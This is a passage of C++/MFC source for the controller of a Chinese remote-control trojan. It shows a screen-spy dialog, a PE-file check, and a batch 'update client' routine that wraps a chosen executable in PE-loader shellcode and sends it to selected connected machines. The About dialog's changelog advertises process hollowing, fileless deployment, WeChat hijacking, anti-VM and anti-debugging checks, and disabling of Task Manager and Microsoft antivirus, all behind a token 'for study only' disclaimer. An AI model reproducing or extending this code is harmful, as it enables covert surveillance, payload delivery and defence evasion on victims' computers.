	// 设置父窗口为卓面
	dlg->Create(IDD_OLDSCREENSPY, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = OLDSCREENSPY_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

/// <summary>
/// 普通屏幕
/// </summary>
void CnbclassDlg::OnConnectOldSrc()
{
	SendSelectCommandPuls(COMMAND_OLDPINGMU);
}

//文件检验判断
BOOL CnbclassDlg::FileCheck(PBYTE buff)
{
	BOOL result = FALSE;

	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)buff;
	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
	{
		MessageBoxA("不是合法得pe文件","警告");
		goto end;
	}

	PIMAGE_NT_HEADERS pNTHeader = (PIMAGE_NT_HEADERS)(buff + pDosHeader->e_lfanew);
	if (pNTHeader->Signature != IMAGE_NT_SIGNATURE)
	{
		MessageBoxA("不是合法得pe文件", "警告");
		goto end;
	}

	if (pNTHeader->FileHeader.SizeOfOptionalHeader == 0xF0)
	{
		MessageBoxA("不支持64位文件", "警告");
		goto end;
	}
	
	if (pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress == 0)
	{
		MessageBoxA("不支持无重定位文件", "警告");
		goto end;
	}
	
	result = TRUE;

end:
	return result;
}

/// <summary>
/// 更新客户端
/// </summary>
void CnbclassDlg::OnUpdateClient()
{

	if (m_ConnectList.GetSelectedCount() < 1)
	{
		MessageBoxA("未选中要更新得机器", "警告", 0);
		return;
	}

	//获取文件
	CFileDialog dlg(1, "exe", 0, OFN_OVERWRITEPROMPT, "可执行文件(*.exe)|*.exe|动态链接库(*.dll)|*.dll||", this);
	if (dlg.DoModal() != IDOK)
	{
		return;
	}
	


	//组装shellcode
	CFile file(dlg.GetPathName().GetBuffer(), CFile::modeRead | CFile::shareDenyNone);
	DWORD size = sizeof(SHELLCODEINFO) + file.GetLength()+1;
	PBYTE buff = (PBYTE)LocalAlloc(LPTR, size);
	if (!buff)
	{
		file.Close();
		return;
	}
	buff[0] = COMMAND_UPDATACLIENT;
	SHELLCODEINFO* tmp = (SHELLCODEINFO*)(buff+1);
	RtlCopyMemory(tmp->shellcode, peloader32, sizeof(peloader32));
	tmp->dwFilelen = file.GetLength();
	file.Read(&tmp->filedata, file.GetLength());
	file.Close();

	//判断文件是否合法
	if (!FileCheck(&tmp->filedata))
	{
		LocalFree(buff);
		return;
	}

	// TODO: Add your command handler code here
	POSITION pos = m_ConnectList.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	//遍历所有选中批量执行
	while (pos) //so long as we have a valid POSITION, we keep iterating
	{
		int	nItem = m_ConnectList.GetNextSelectedItem(pos);
		CString con = m_ConnectList.GetItemText(nItem, CONNECT_CONTEXT);
		ClientContext* conn = (ClientContext*)atoi(con);
		//ClientContext* pContext = (ClientContext*)m_ConnectList.GetItemData(nItem);
		ClientContext* pContext = conn;
		// 发送获得驱动器列表数据包
		m_iocpServer->Send(pContext, buff, size);
		//Save the pointer to the new item in our CList
	} //EO while(pos) -- at this point we have deleted the moving items and stored them in memoryt	

	LocalFree(buff);

	MessageBoxA("更新完毕", "提示");
}

//版本信息
BOOL CAboutDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();
	VerInfo = "免责声明:此软件仅供学习交流,用于远程协助和远程管理，不得未经允许控制破坏他人计算机。请在24小时内删除，因本程序造成的任何法律责任自行承担。\r\n";
	VerInfo += "===========================================================================================================\r\n\r\n";
	VerInfo += "ver 2.2\r\n";
	VerInfo += "1.新增旧版屏幕\r\n";
	VerInfo += "2.新增批量小马更新\r\n";
	VerInfo += "3.增加上线列表排序功能\r\n\r\n";
	VerInfo += "ver 2.1\r\n";
	VerInfo += "1.修复白文件dll,可自动化重启上线\r\n";
	VerInfo += "2.更改流量加密方式\r\n";
	VerInfo += "3.添加控制上线是否启用傀儡进程\r\n";
	VerInfo += "4.新增命令上线，文件不落地\r\n\r\n";
	VerInfo += "ver 2.0\r\n";
	VerInfo += "1.新增dll生成\r\n";
	VerInfo += "2.新增c文件生成\r\n";
	VerInfo += "3.增加导入表注入功能\r\n\r\n";
	VerInfo += "ver 1.3\r\n";
	VerInfo += "1.shellcode生成改用通用shellcode，任何开源的shellcode加载器均可加载\r\n";
	VerInfo += "2.文件管理功能新增点击表头实现文件按修改时间排序\r\n";
	VerInfo += "3.文件管理新增文件隐藏功能\r\n";
	VerInfo += "4.新增上线机器系统类型统计\r\n";
	VerInfo += "5.新增进程列表内进程查找功能\r\n";
	VerInfo += "6.新增白文件上线，内置自启动\r\n";
	VerInfo += "7.修复进程列表排序后无法结束进程问题\r\n\r\n";
	VerInfo += "ver 1.2\r\n";
	VerInfo += "1.上线列表增加安装日期显示\r\n";
	VerInfo += "2.备注功能，本地备注改为远程备注\r\n";
	VerInfo += "3.优化文件下载速度\r\n\r\n";
	VerInfo += "ver 1.1\r\n";
	VerInfo += "1.新增微信劫持上线生成\r\n";
	VerInfo += "2.新增后台桌面功能\r\n";
	VerInfo += "3.去除DLL生成功能\r\n";
	VerInfo += "4.去除客户端注册表安装以及服务安装\r\n";
	VerInfo += "5.新增反微步，虚拟机，调试功能\r\n";
	VerInfo += "6.新增禁用任务管理器功能\r\n";
	VerInfo += "7.新增禁用微软杀软功能\r\n";
	VerInfo += "8.新增软件透明度配置\r\n";
	VerInfo += "9.新增shellcode功能生成\r\n\r\n";
	VerInfo += "ver 1.0\r\n";
	VerInfo += "1.远程管理程序的诞生\r\n";
	UpdateData(0);
	return TRUE;  // return TRUE unless you set the focus to a control
				  // 异常: OCX 属性页应返回 FALSE
}

